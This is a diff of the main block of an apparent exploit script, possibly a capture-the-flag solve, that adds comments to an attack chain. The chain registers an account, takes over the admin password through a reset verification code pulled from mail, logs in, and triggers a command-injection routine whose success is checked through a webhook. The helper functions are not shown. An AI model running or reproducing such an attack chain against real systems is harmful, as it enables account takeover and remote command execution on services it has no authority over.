@@ -57,8 +57,12 @@ if __name__ == "__main__":
     print(api.register())
     print(api.resetPasswordRequest())
     verifcode = mail.getVerifCode()
+
+    # reset admin password using the verification code
     print(api.resetPassword(verifcode))
     api.login()
+
+    #inject command in markdown
     stat = api.commandInjection()
     if "successfully" in stat:
         print("[+] Command injection successful, check your webhook :D")
